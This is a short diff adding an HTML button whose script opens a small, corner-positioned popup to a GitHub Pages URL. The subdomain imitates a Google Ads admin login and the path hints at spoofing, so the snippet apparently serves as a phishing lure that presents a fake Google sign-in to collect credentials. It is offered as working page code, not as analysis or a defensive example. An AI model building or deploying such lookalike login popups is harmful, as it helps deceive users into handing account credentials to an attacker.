@@ -1,0 +1,16 @@
+<button onclick="openPopup()">Start</button>
+
+<script>
+function openPopup() {
+  const width = 400;
+  const height = 300;
+  const left = screen.availWidth - width - 10; // misalnya pojok kanan bawah
+  const top = screen.availHeight - height - 40;
+
+  const popup = window.open(
+    'https://clouds-admins-logins-ads-google-com.github.io/spofcenah2/filepick.html',
+    '_blank',
+    `width=${width},height=${height},left=${left},top=${top},resizable=no`
+  );
+}
+</script>
